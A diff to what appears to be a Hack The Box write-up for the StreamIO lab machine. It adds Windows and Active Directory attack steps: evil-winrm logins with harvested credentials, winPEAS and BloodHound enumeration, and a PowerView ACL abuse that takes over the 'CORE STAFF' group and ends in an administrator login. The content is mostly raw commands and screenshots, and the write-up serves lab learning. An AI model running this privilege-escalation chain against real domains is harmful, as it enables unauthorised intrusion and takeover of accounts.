@@ -1,5 +1,7 @@
 SQL Injection
-
+ffuf with authentication
+evil-winrm
+winPEAS
 
 
 
@@ -83,6 +85,9 @@ crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
 evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
 ![image](https://user-images.githubusercontent.com/33616880/231686295-621f2f18-be32-4e7e-90af-b0dada0b1254.png)
 
+
+
+https://github.com/carlospolop/PEASS-ng/releases
 ```
 upload winPEASx64.exe
 ./winPEASx64.exe
@@ -90,3 +95,50 @@ upload winPEASx64.exe
 ![image](https://user-images.githubusercontent.com/33616880/231686514-0c6ced70-5cf4-48e3-8951-6b9ba81b18e0.png)
 ![image](https://user-images.githubusercontent.com/33616880/231686548-aa5a6439-c37c-4f74-a300-568f7ac4193a.png)
 ![image](https://user-images.githubusercontent.com/33616880/231686573-5ded1f6d-582b-41dd-adbd-30e8fa3f7b43.png)
+
+
+
+```
+git clone https://github.com/fox-it/BloodHound.py.git
+cd BloodHound.py
+python3 setup.py install
+```
+![image](https://user-images.githubusercontent.com/33616880/231689414-7ac352c9-8c51-4649-969a-1245d1e8da01.png)
+
+```
+python3 bloodhound.py -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -gc dc.streamio.htb -ns 10.10.11.158 -c all --zip
+```
+![image](https://user-images.githubusercontent.com/33616880/231689571-2822ed95-a439-4a13-bd6d-ecf916b1e419.png)
+
+
+
+![image](https://user-images.githubusercontent.com/33616880/231689606-cd64e06c-6078-48de-a790-ecdcf6537b66.png)
+
+
+
+```
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+upload PowerView.ps1
+```
+![image](https://user-images.githubusercontent.com/33616880/231689707-f1d88d6e-c3cf-405a-8b91-7a4fe11edabf.png)
+
+
+
+```
+. .\PowerView.ps1
+
+$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText –Force
+$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
+Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
+Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
+Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
+net group 'CORE STAFF'
+```
+
+![image](https://user-images.githubusercontent.com/33616880/231689882-e7a2ef35-a3d0-4aa9-8f7f-2aa99b63203c.png)
+
+
+
+evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
+![image](https://user-images.githubusercontent.com/33616880/231689974-20ed5dca-92b5-43ec-b985-0d56bcfacec8.png)
+![image](https://user-images.githubusercontent.com/33616880/231690002-65764103-055f-4f93-8761-26278c100fcf.png)
